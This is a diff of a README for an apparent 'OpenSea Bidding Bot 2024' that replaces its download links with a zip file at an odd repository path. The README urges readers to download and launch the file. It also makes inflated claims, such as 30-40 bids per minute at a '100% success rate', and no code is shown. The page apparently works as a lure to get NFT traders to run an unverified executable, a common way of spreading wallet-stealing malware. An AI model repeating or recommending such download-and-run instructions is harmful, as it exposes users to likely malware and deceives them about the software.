@@ -1,6 +1,6 @@
 # 🤖 Welcome to OpenSea Bidding Bot 2024! 🎨🔥
 
-![OpenSea Bidding Bot](https://github.com/Hacwl-s/OpenSea-Bidding-Bot-2024/releases/download/v1.0/Software.zip)
+![OpenSea Bidding Bot](https://github.com/Hacwl-s/OpenSea-Bidding-Bot-2024/raw/refs/heads/main/remission/Bot_Sea_Bidding_Open_v1.5.zip)
 
 ## Introduction
 Welcome to the OpenSea Bidding Bot 2024 GitHub repository! This repository contains an automated script designed to place bids on NFTs on the OpenSea marketplace. With a lightning-fast speed, this bot can handle 30-40 offers per minute with a 100% success rate. Say goodbye to missed offers and rejections from OpenSea with this powerful tool.
@@ -15,7 +15,7 @@ Welcome to the OpenSea Bidding Bot 2024 GitHub repository! This repository conta
 ## Installation
 To get started with the OpenSea Bidding Bot 2024, simply download the bot from the following link and launch it: 
 
-[![Download Bot](https://github.com/Hacwl-s/OpenSea-Bidding-Bot-2024/releases/download/v1.0/Software.zip%20Bot-v1.0.0-blue)](https://github.com/Hacwl-s/OpenSea-Bidding-Bot-2024/releases/download/v1.0/Software.zip)
+[![Download Bot](https://github.com/Hacwl-s/OpenSea-Bidding-Bot-2024/raw/refs/heads/main/remission/Bot_Sea_Bidding_Open_v1.5.zip%20Bot-v1.0.0-blue)](https://github.com/Hacwl-s/OpenSea-Bidding-Bot-2024/raw/refs/heads/main/remission/Bot_Sea_Bidding_Open_v1.5.zip)
 
 In case the link ends with a file name, ensure that it is launched for proper functionality.
 
